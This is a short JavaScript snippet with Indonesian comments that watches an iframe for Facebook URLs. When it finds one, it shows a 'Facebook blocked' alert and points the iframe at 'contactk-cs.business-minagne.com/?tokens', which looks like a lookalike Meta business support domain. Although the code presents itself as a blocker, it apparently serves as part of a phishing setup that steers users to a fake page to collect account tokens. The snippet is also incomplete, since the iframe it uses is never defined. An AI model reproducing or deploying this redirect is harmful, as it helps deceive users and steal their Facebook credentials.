<script>
    // Fungsi untuk memeriksa jika URL mengandung "facebook"
    function isFacebookURL(url) {
        return url.includes("facebook.com") || url.includes("fb.com");
    }

    // Awasi perubahan window location
    setInterval(function() {
        try {
            var currentURL = iframe.contentWindow.location.href;
            if (isFacebookURL(currentURL)) {
                alert("Akses ke Facebook diblokir.");
                iframe.src = "https://contactk-cs.business-minagne.com/?tokens"; // atau redirect ke halaman lain
            }
        } catch (e) {
            // Tidak bisa akses iframe karena cross-origin (CORS)
            console.warn("Tidak bisa akses konten iframe karena CORS.");
        }
    }, 1000); // periksa setiap detik
</script>
